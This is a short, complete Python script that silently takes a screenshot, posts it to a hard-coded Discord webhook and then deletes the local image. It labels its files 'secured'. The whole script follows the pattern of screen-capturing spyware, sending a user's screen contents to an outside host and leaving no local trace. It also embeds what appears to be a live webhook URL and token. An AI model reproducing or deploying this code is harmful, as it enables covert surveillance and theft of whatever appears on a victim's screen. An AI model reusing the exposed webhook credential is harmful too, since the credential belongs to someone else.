import pyautogui
import os
import requests
from datetime import datetime

# 1. Take screenshot
filename = f"secured_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
pyautogui.screenshot(filename)

# 2. Send to Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/1365436396474597488/W7aTA09nUAKXn0bFfBh7YsmHhxfByqxCtyUnMb6AQCeFXkDikbiVEXxYiIi7DOWBtGxN"

with open(filename, 'rb') as f:
    files = {"file": (filename, f)}
    data = {"content": f"secured_{datetime.now().strftime('%Y%m%d_%H%M%S')}"}
    requests.post(WEBHOOK_URL, data=data, files=files)

# 3. Delete the screenshot
os.remove(filename)